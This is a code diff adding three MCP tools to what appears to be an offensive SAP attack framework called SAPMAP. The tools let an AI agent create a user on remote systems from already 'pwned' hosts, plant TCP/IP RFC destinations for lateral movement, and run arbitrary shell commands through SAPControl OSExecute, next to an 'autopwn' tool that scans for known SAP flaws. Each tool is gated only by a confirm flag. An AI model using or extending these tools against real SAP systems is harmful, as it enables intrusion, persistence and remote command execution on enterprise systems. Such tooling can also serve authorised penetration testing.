@@ -580,6 +580,95 @@ def manage_rfcs(sid: str, action: str = "retrieve",
 
 
 @mcp.tool()
+def create_user_via_rfc(sid: str, destination: str,
+                        target_sid: str = "",
+                        confirm: bool = False) -> str:
+    """Create the SAPMAP user on a remote system via an RFC destination.
+    Uses an existing Type-3 (ABAP) RFC connection from the source system
+    to reach the target — no direct network access needed.
+    REQUIRES confirm=true.
+
+    Args:
+        sid: Source system SID (must be pwned with credentials)
+        destination: RFC destination name (from SM59/RFCDES)
+        target_sid: Expected target SID (for verification)
+        confirm: Must be true to execute
+    """
+    if not confirm:
+        return json.dumps({
+            "status": "blocked",
+            "message": "User creation via RFC requires confirm=true."
+        })
+    resp = _api("POST", f"/api/node/{sid}/create_user_via_rfc", {
+        "destination_name": destination,
+        "target_sid": target_sid,
+    })
+    _wait_for_tasks(timeout=300)
+    return json.dumps(resp)
+
+
+@mcp.tool()
+def create_tcpip_dest(sid: str, destination: str, host: str,
+                      program: str = "",
+                      confirm: bool = False) -> str:
+    """Create a TCP/IP (Type-T) RFC destination on a pwned ABAP system.
+    Used to seed a destination that SXPG_STEP_XPG_START or SAPControl
+    OSExecute can bounce through for lateral movement.
+    REQUIRES confirm=true.
+
+    Args:
+        sid: Source system SID (must be pwned with credentials)
+        destination: Destination name to create (e.g. SAPMAP_PIVOT)
+        host: Target host IP or hostname
+        program: Registered server program ID (optional)
+        confirm: Must be true to execute
+    """
+    if not confirm:
+        return json.dumps({
+            "status": "blocked",
+            "message": "TCP/IP destination creation requires confirm=true."
+        })
+    resp = _api("POST", f"/api/node/{sid}/create_tcpip_dest", {
+        "destination": destination,
+        "host": host,
+        "program": program,
+    })
+    _wait_for_tasks(timeout=120)
+    return json.dumps(resp)
+
+
+@mcp.tool()
+def sapcontrol_osexecute(sid: str, destination_name: str,
+                         command: str, timeout: int = 30,
+                         confirm: bool = False) -> str:
+    """Execute an OS command via SAPControl OSExecute on a remote system.
+    Uses a Type-G RFC destination that has been verified as os_exec capable
+    (run manage_rfcs test_single first). The SOAP call blocks until the
+    command completes.
+    REQUIRES confirm=true.
+
+    Args:
+        sid: Source system SID (must be pwned)
+        destination_name: Type-G RFC destination name
+        command: Shell command to execute on the remote host
+        timeout: Command timeout in seconds (default 30)
+        confirm: Must be true to execute
+    """
+    if not confirm:
+        return json.dumps({
+            "status": "blocked",
+            "message": "SAPControl OSExecute requires confirm=true."
+        })
+    resp = _api("POST", f"/api/node/{sid}/sapcontrol_osexecute", {
+        "destination_name": destination_name,
+        "command": command,
+        "timeout": timeout,
+    })
+    _wait_for_tasks(timeout=max(timeout + 30, 120))
+    return json.dumps(resp)
+
+
+@mcp.tool()
 def autopwn(max_waves: int = 5, scan_gw: bool = True,
             scan_10kblaze: bool = False,
             scan_cve_31324: bool = True,
